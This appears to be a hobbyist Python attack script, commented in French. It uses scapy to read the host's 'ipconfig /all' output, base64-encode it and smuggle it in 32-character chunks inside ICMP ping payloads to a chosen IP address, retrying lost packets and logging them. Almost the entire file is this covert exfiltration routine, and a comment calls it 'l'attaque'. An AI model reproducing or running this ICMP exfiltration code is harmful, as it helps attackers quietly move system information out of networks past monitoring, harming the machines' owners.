#! /usr/bin/env python3
import sys
from scapy.all import *
import base64
import os
import colorama
from colorama import Fore
from colorama import Style
def faireping(ip):
    try :
        colorama.init()
        print(Fore.MAGENTA + Style.BRIGHT +"                 |"+"-----------------------------------------------------"+"|"+ Style.RESET_ALL)
        print(Fore.MAGENTA + Style.BRIGHT +"                 |"+Style.RESET_ALL+ Fore.GREEN + Style.BRIGHT +"    Quitter à n'importe quel moment : Contrôle + C "+Style.RESET_ALL+ Fore.MAGENTA + Style.BRIGHT+"  |"+ Style.RESET_ALL)
        print(Fore.MAGENTA + Style.BRIGHT +"                 |"+"-----------------------------------------------------"+"|"+ Style.RESET_ALL+"\n")
        os.system("ipconfig/all > resultat.txt" )
        with open("resultat.txt", 'rb') as f:
            encoded_string = base64.b64encode(f.read())
            print (Fore.GREEN + Style.BRIGHT + '\n Fichier converti en base 64 ! '+Style.RESET_ALL)
            # ici ouevrture du fichier et conversion en b64
            fichier = open("resultat2.txt", "w")
            fichier.write (str(encoded_string))
            # on vient y mettre la variable converti en b64 dans un second fichier 
        # maintenant je vais ouvrir le fichier puis le lire lettre par lettre 
        f.close()
        fichier.close()
        l = open('resultat2.txt', 'r')
        lettre = l.read()

        nbr_cara = len(lettre)
        print (nbr_cara)     
        # ici j'ai ouvert mon fichier l'ai lu et compter le nombre de caractere puis stocker dans une variable
           
        
        rep1 = 0
        rep2 = 0
        # rep 1 et 2 pour comptabiliser les pings ok et non 
        i=0
        # nombre de caractere pour quitter la boucle
        sq = 1
        #le numéro de séquence est la pour éviter la perte de paquet  
        lost = []
        # pour les pings perdu
        debut = 0
        fin = 32
        #mettre 32 caractère
        
         #dans cette boucle j'envoi des ping par 32 lettres 
        for j in lettre:
            
            mon_ping = Ether() / IP(dst=ip) / ICMP(seq=sq) / Raw (lettre[debut:fin])
            # je forge mon ping avec numéro de séquence et qu'avec 32 caractere par raw
            rep,non_rep = srp(mon_ping, retry= 5,timeout=10)
            # j'envoie mon ping avec 5 retry si s'envoi pas et un timeout de 10s en plus si ca n'y arrive pas 
            debut = debut + 32
            fin = fin + 32
            # on incrémente pour toujours envoyé les 32 carcateres suivants
            i = i + 32
            
            # print (f"holla le {lettre[debut:fin]}")
            
            # ok ici en gros dans mon rep non rep on va avoir un message sous forme de udp icmp avec une valeur 
            # et si le ping est envoyé il y aura icmp 1 dans rep si c est pas envoyé icmp 0
            # donc c'est juste pour voir ou j'en suis dans les test le print peut etre enlever pour l'attaque 
            if rep :
                print (Fore.GREEN + Style.BRIGHT +'-----------ping ok -----------'+Style.RESET_ALL)
                rep1 = rep1 + 1
                sq = sq + 1
            if non_rep :
                print (Fore.MAGENTA + Style.BRIGHT +'-----------Ping non ok -----------'+Style.RESET_ALL)
                rep2 = rep2 + 1
                lost.append(lettre[debut:fin])
                lost.append(sq)
                sq = sq + 1
                # ici si le ping est non envoyé je stock dans un tableau mes caractere qui devait etre envoyé ainsi que mon numerpo de sequence
            # if le i est égale au nombre de caractere compter au debut on sort du programme

            if i >= nbr_cara:
                    print (Fore.MAGENTA + Style.BRIGHT +"-----------C'est fini-------------"+Style.RESET_ALL)
                    print (i)
                    break
            else :
                    print (i)
        print (f"Le nombre de ping ok est {rep1} ")
        print (f"Le nombre de ping non ok est {rep2}")
        # nombre de ping ok et non ok 
        print (lost)
    except KeyboardInterrupt:
        print(Fore.GREEN + Style.BRIGHT + '\n Vous avez arrêté le processus, à plus tard...'+Style.RESET_ALL)
        
        # c'est pour prendre en charge le crtl +c
        sys.exit(0)
    except (ValueError, NameError, TypeError, ZeroDivisionError, EOFError, RuntimeError):
       print (Fore.GREEN + Style.BRIGHT +"\n Error formuler différemment ou essayé plus tard bonne journée.."+Style.RESET_ALL)
    # ici les value error et tous on s'en branle ca met mes messages d'erreur c'est esthetique on va dire 
    except Exception:
        traceback.print_exc(file=sys.stdout)
    sys.exit(0)